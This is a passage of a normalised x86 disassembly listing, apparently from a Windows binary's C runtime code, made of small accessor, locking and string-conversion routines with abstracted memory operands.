retn 0x4
sub_42706a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
not eax
and [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_42707b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
not eax
and [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_42708c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
not eax
and [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_42709d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
not eax
and [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_4270ae
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
not eax
and [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_4270bf
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
not eax
and [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_4270d0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
not eax
and [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_4270e1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
not eax
and [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_4270f2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
not eax
and [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_427103
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
not eax
and [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_427114
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
not eax
and [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_4273ff
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x24 ] eax
mov al 0x1
retn
sub_42740f
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x24 ] eax
mov al 0x1
retn
sub_42741f
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x24 ] eax
mov al 0x1
retn
sub_42742f
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x24 ] eax
mov al 0x1
retn
sub_427719
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x28 ] eax
mov al 0x1
retn
sub_427729
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x28 ] eax
mov al 0x1
retn
sub_427739
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x28 ] eax
mov al 0x1
retn
sub_427749
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x28 ] eax
mov al 0x1
retn
sub_427759
mov eax [ ecx ]
test eax eax
jne r-xdata
push eax
call sub_4280e7
pop ecx
retn
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
retn
sub_42777a
cmp [ ecx ] 0x0
jne r-xdata
mov al 0x1
retn
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
retn
sub_427795
cmp [ ecx ] 0x0
jne r-xdata
mov al 0x1
retn
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
retn
sub_4277b0
cmp [ ecx ] 0x0
jne r-xdata
mov al 0x1
retn
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
retn
sub_427cef
mov al 0x1
retn
sub_427cf2
mov al 0x1
retn
sub_427cf5
mov al 0x1
retn
sub_427cf8
mov al 0x1
retn
sub_427cfb
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ ecx + 0x1c ] 0x7
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
retn
sub_427d1d
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ ecx + 0x1c ] 0x7
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
retn
sub_427d3f
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ ecx + 0x1c ] 0x7
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
retn
sub_427d61
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ ecx + 0x1c ] 0x7
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
retn
sub_427f83
mov al 0x1
retn
sub_427f86
mov al 0x1
retn
sub_427f89
mov al 0x1
retn
sub_427f8c
mov al 0x1
retn
sub_4280db
mov al 0x1
retn
sub_4280de
mov al 0x1
retn
sub_4280e1
mov al 0x1
retn
sub_4280e4
mov al 0x1
retn
sub_428169
mov al 0x1
retn
sub_42816c
mov eax r--data
retn
sub_428172
mov eax r--data
retn
sub_428178
mov eax r--data
retn
sub_42817e
mov eax r--data
retn
sub_428184
mov eax r--data
retn
sub_42818a
mov eax r--data
retn
sub_428190
mov eax r--data
retn
sub_428196
mov eax r--data
retn
sub_42819c
mov eax r--data
retn
sub_4281a2
mov eax r--data
retn
sub_4281a8
mov eax r--data
retn
sub_4281ae
mov eax r--data
retn
sub_428c28
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
movzx ecx [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
pop ebp
retn
sub_428c43
mov ecx [ rw-data ]
xor eax eax
test ecx ecx
setne al
retn
sub_429223
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_4290b5
sub_42922e
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_429130
sub_429240
mov edx r--data
jmp sub_435e57
sub_42924a
mov edx r--data
jmp sub_435dd0
sub_4296f0
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
retn
sub_429708
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx eax
xor eax [ ebp + 0x8 ]
and ecx 0x1f
ror eax cl
pop ebp
retn
sub_42973d
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
push eax
call sub_42983d
pop ecx
retn
sub_42975c
xor eax eax
retn
sub_429790
mov eax ecx
retn
sub_429793
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_42975f
pop ebp
retn
sub_429834
push 0x0
call sub_42f374
pop ecx
retn
sub_429894
push 0x0
call sub_42f374
pop ecx
retn
sub_42989d
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_42d0e4
sub_429a5f
xor al al
retn
sub_429c40
mov eax [ rw-data ]
retn
sub_429c46
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_429c55
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx eax
xor eax [ ebp + 0x8 ]
and ecx 0x1f
ror eax cl
pop ebp
retn
sub_429cbb
mov eax ecx
retn
sub_429cbe
mov eax [ rw-data ]
mov ecx eax
xor eax [ rw-data ]
and ecx 0x1f
ror eax cl
neg eax
sbb eax eax
neg eax
retn
sub_429cd7
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_429c8a
pop ebp
retn
sub_429d34
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_429c6b
pop ecx
mov [ rw-data ] eax
pop ebp
retn
sub_429d49
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d0aa
pop ecx
pop ebp
retn 0x4
sub_429d5b
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d0aa
pop ecx
pop ebp
retn 0x4
sub_429d6d
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d0aa
pop ecx
pop ebp
retn 0x4
sub_429fc2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ eax ]
call [ GetModuleFileNameA@IAT ]
pop ebp
retn
sub_429fdc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ eax ]
call [ GetModuleFileNameW@IAT ]
pop ebp
retn
sub_42a2f1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ rw-data ] eax
pop ebp
retn
sub_42a302
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ rw-data ] eax
pop ebp
retn
sub_42a313
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42a323
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42a333
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42a343
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42a353
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42a363
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42a375
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42a387
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42a399
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_42a3a1
mov eax [ ecx ]
xor edx edx
mov ecx [ eax ]
cmp [ ecx ] edx
je r-xdata
mov eax edx
retn
lea ecx [ ecx + 0x4 ]
inc edx
cmp [ ecx ] 0x0
jne r-xdata
sub_42a3b7
mov eax [ ecx ]
xor edx edx
mov ecx [ eax ]
cmp [ ecx ] edx
je r-xdata
mov eax edx
retn
lea ecx [ ecx + 0x4 ]
inc edx
cmp [ ecx ] 0x0
jne r-xdata
sub_42a3cd
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_42a3d3
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_42a3d9
mov eax [ ecx ]
and [ ecx ] 0x0
retn
j_sub_437d97#2
jmp sub_437d97
sub_42a3e4
retn
sub_42a3e5
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_437861
sub_42a3f0
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_43786c
sub_42a3fb
mov eax [ ecx ]
retn
sub_42a3fe
mov eax [ ecx ]
retn
sub_42a401
mov eax [ ecx ]
retn
sub_42a404
mov eax ecx
retn
sub_42a407
mov eax ecx
retn
sub_42a40a
mov eax rw-data
retn
sub_42a410
mov eax rw-data
retn
sub_42a416
mov eax [ rw-data ]
retn
sub_42a41c
mov eax [ rw-data ]
retn
sub_42a422
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_42a42a
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42a43c
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42a44e
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42a460
mov edi edi
push ebp
mov ebp esp
movsx eax [ ebp + 0x8 ]
push eax
call sub_43835a
neg eax
pop ecx
sbb eax eax
neg eax
pop ebp
retn
sub_42a478
xor al al
retn
sub_42a4d0
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_429d7f
sub_42a4db
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_429ea3
sub_42a4e6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_42a4f5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_42a504
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d0aa
pop ecx
pop ebp
retn 0x4
sub_42a516
mov eax [ rw-data ]
test eax eax
jne r-xdata
retn
call sub_42a53e
mov [ rw-data ] eax
sub_42a52a
mov eax [ rw-data ]
test eax eax
jne r-xdata
retn
call sub_42a56d
mov [ rw-data ] eax
j_sub_438569
jmp sub_438569
j_sub_4385ec
jmp sub_4385ec
sub_42a9ef
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_438e62
pop ecx
pop ecx
pop ebp
retn
sub_42aa07
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_438e6d
pop ecx
pop ecx
pop ebp
retn
sub_42ab11
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ rw-data ]
je r-xdata
pop ebp
retn
push eax
call sub_42a88f
pop ecx
sub_42ab2c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ rw-data ]
je r-xdata
pop ebp
retn
push eax
call sub_42a8be
pop ecx
sub_42ab47
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42ab57
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42ab69
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_42ab71
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_42ab79
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_42abb7
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0xffffffff
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call [ MultiByteToWideChar@IAT ]
pop ebp
retn
sub_42abf4
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_42abfa
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_42ac00
mov eax [ ecx ]
retn
sub_42ac03
mov eax rw-data
retn
sub_42ac09
mov eax rw-data
retn
sub_42ac0f
mov eax rw-data
retn
sub_42ac15
mov eax rw-data
retn
sub_42ac1b
mov eax rw-data
retn
sub_42ac21
mov eax rw-data
retn
sub_42ac89
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_42ac91
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_42ac99
xor eax eax
cmp [ ecx ] eax
setne al
retn
j_sub_437d97
jmp sub_437d97
sub_42aca6
retn
sub_42aca7
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42acb9
mov eax ecx
retn
sub_42acbc
mov eax ecx
retn
j_sub_42a53e#2
jmp sub_42a53e
j_sub_42a56d#2
jmp sub_42a56d
sub_42ad00
mov eax rw-data
retn
sub_42ad06
mov eax rw-data
retn
sub_42ad0c
mov eax [ rw-data ]
test eax eax
jne r-xdata
retn
call sub_42a53e
mov [ rw-data ] eax
sub_42ad20
mov eax [ rw-data ]
test eax eax
jne r-xdata
retn
call sub_42a56d
mov [ rw-data ] eax
j_sub_42a59c#2
jmp sub_42a59c
j_sub_42a5f5
jmp sub_42a5f5
j_sub_437d97#3
jmp sub_437d97
sub_42addc
retn
sub_42addd
mov eax [ rw-data ]
retn
sub_42ade3
mov eax [ rw-data ]
retn
sub_42ade9
mov edi edi
push ebp
mov ebp esp
movsx eax [ ebp + 0x8 ]
push eax
call sub_43835a
neg eax
pop ecx
sbb eax eax
neg eax
pop ebp
retn
sub_42ae01
xor al al
retn
sub_42af3e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
pop ebp
retn
sub_42b0a0
push esi
call sub_4390d5
pop ecx
retn
sub_42b192
xor eax eax
retn
sub_42b195
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d0aa
pop ecx
pop ebp
retn 0x4
sub_42b1a7
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d0aa
pop ecx
pop ebp
retn 0x4
sub_42b1b9
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d0aa
pop ecx
pop ebp
retn 0x4
sub_42b1cb
push 0x8
push r--data
call sub_40d260
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_42b4f0
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42b1f7
call sub_40d2a6
retn 0xc
sub_42b1f7
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
mov eax [ eax ]
and [ eax + 0x350 ] 0xffffffef
retn
sub_42b244
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_42f374
pop ecx
retn
sub_42b287
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_42f374
pop ecx
retn
sub_42b2cf
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_42f374
pop ecx
retn
sub_42b36f
retn
sub_42b370
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42b382
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42b3ba
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42b3cc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42b3de
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42b3ee
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42b400
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42b43a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42b44c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42b45c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42b46c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42b47c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42b48c
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42b49e
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42b4b0
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42b4c2
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_42b4ca
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_42b4d2
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_42b4da
push [ ecx ]
call sub_42f374
pop ecx
retn
sub_42b4e3
mov eax [ ecx ]
mov eax [ eax ]
push [ eax ]
call sub_43aed9
pop ecx
retn
sub_42b54c
retn
sub_42b54d
push [ ecx ]
call sub_42f32c
pop ecx
retn
sub_42b556
push [ ecx ]
call sub_42f374
pop ecx
retn
sub_42b55f
mov eax [ ecx ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
[ eax ]
retn
sub_42b56a
push [ ecx ]
call sub_42f32c
pop ecx
retn
sub_42b573
push [ ecx ]
call sub_42f32c
pop ecx
retn
sub_42b67a
push [ ecx ]
call sub_42f374
pop ecx
retn
sub_42b683
mov eax [ ecx ]
mov eax [ eax ]
and [ eax + 0x350 ] 0xffffffef
retn
sub_42b68f
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_42b695
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_42b69b
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_42b6a1
mov eax [ ecx ]
retn
sub_42b6a4
mov eax [ ecx ]
retn
sub_42b6a7
mov eax [ ecx ]
retn
sub_42b6aa
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_42b6b2
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_42b6ba
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_42b6c2
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42b6d4
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42b6e6
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42b6f8
mov eax ecx
retn
sub_42b761
xor eax eax
mov ecx rw-data
inc eax
xchg [ ecx ] eax
retn
sub_42b7b5
push 0x4
call sub_42f374
pop ecx
retn
sub_42be6c
push 0x5
call sub_42f374
pop ecx
retn
sub_42be78
push 0x4
call sub_42f374
pop ecx
retn
sub_42c935
mov eax [ rw-data ]
retn
sub_42c96a
mov eax rw-data
retn
j_sub_42d0aa#3
jmp sub_42d0aa
sub_42c975
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
retn
sub_42c98d
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d0aa
pop ecx
pop ebp
retn 0x4
sub_42c9be
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42c9ce
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42ca31
push 0x2
call sub_42f374
pop ecx
retn
sub_42ca3a
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_42ca40
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_42cd10
push rw-data
mov ecx rw-data
call sub_42ce10
mov al 0x1
retn
sub_42cd22
push rw-data
call sub_42cb9a
mov [ esp ] rw-data
call sub_42cb9a
pop ecx
mov al 0x1
retn
sub_42cd3c
mov al 0x1
retn
sub_42cd3f
mov al 0x1
retn
sub_42cd42
call sub_42acc9
mov al 0x1
retn
sub_42cd4a
mov al 0x1
retn
sub_42cd4d
mov al 0x1
retn
sub_42cd8d
push 0x0
call sub_40e7c5
pop ecx
retn
sub_42ce0d
mov al 0x1
retn
sub_42ce41
push r--data
push r--data
call sub_43c570
pop ecx
pop ecx
retn
sub_42ce53
call sub_42faa1
test eax eax
setne al
retn
sub_42ce5e
call sub_42f9f1
mov al 0x1
retn
sub_42ce66
push r--data
push r--data
call sub_43c5f3
pop ecx
pop ecx
retn
sub_42ce78
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42fb52
pop ecx
mov al 0x1
pop ebp
retn
sub_42cee9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
test eax eax
jne r-xdata
pop ebp
retn
mov eax sub_42d153
sub_42ceff
call sub_42fa1d
mov eax [ eax + 0xc ]
test eax eax
jne r-xdata
retn
mov eax sub_42d153
sub_42cf59
xor eax eax
inc eax
retn
sub_42d021
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
xchg [ ecx ] eax
pop ebp
retn
sub_42d030
mov eax [ rw-data ]
retn
sub_42e840
mov edx [ ecx + 0x4 ]
test edx edx
je r-xdata
retn
mov eax [ ecx ]
mov [ edx ] eax
sub_42e850
mov edx [ ecx + 0x4 ]
test edx edx
je r-xdata
retn
mov eax [ ecx ]
mov [ edx ] eax
sub_42e860
mov edx [ ecx ]
mov al [ edx ]
inc edx
mov [ ecx ] edx
retn
sub_42e870
mov edx [ ecx ]
movzx eax [ edx ]
add edx 0x2
mov [ ecx ] edx
retn
sub_42e8e0
mov edi edi
push ebp
mov ebp esp
push 0x8
push [ ebp + 0x8 ]
call sub_43db11
add esp 0x8
neg eax
sbb eax eax
neg eax
pop ebp
retn
sub_42e900
mov eax 0x7fffffff
retn
sub_42e910
or eax 0xffffffff
mov edx 0x7fffffff
retn
sub_42e920
mov eax 0x80000000
retn
sub_42e930
xor eax eax
mov edx 0x80000000
retn
sub_42ec40
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov al 0x1
pop ebp
retn 0x4
sub_42ec50
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov al 0x1
pop ebp
retn 0x4
sub_42ec60
mov eax [ ecx ]
retn
sub_42ec70
mov eax [ ecx ]
retn
sub_42ece0
cmp [ ecx ] 0x0
jne r-xdata
mov al 0x1
retn
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
retn
sub_42ed00
cmp [ ecx ] 0x0
jne r-xdata
mov al 0x1
retn
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
retn
sub_42ef7c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
pop ebp
retn
sub_42f32c
mov edi edi
push ebp
mov ebp esp
imul eax [ ebp + 0x8 ] 0x18
add eax rw-data
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
sub_42f374
mov edi edi
push ebp
mov ebp esp
imul eax [ ebp + 0x8 ] 0x18
add eax rw-data
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_42f38b
push 0x4
call sub_42f32c
pop ecx
retn
sub_42f394
push 0x4
call sub_42f374
pop ecx
retn
sub_42f39d
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d0aa
pop ecx
pop ebp
retn 0x4
sub_42f3f3
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_42f374
pop ecx
retn
sub_42f454
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_42f374
pop ecx
retn
sub_42f49f
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_42f374
pop ecx
retn
sub_42f4e7
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_42f374
pop ecx
retn
sub_42f593
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42f5a5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42f5b7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42f5c9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42f5db
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42f5eb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42f5fd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42f60f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_42f621
mov edi edi
push ebp
mov ebp esp
